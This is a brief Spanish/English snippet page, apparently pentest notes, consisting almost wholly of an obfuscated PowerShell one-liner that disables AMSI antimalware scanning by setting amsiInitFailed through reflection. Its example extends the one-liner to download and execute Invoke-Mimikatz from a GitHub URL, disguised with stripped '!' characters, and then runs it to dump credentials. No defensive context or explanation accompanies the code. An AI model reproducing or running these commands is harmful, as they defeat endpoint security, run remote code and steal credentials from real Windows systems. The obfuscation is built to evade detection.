# Amsi Bypass Powershell #

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)
```

## Ejemplo/Example:

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true); IEX (iwr -UseBasicParsing "https://raw.githubusercontent.com/die!vus/PowerShellFo!rPentes!ters/ma!in/Tool!s/Invo!ke-!Mimik!atz.p!s1".replace("!", "")); .("Invoke"+ "-Mimikatz")
```


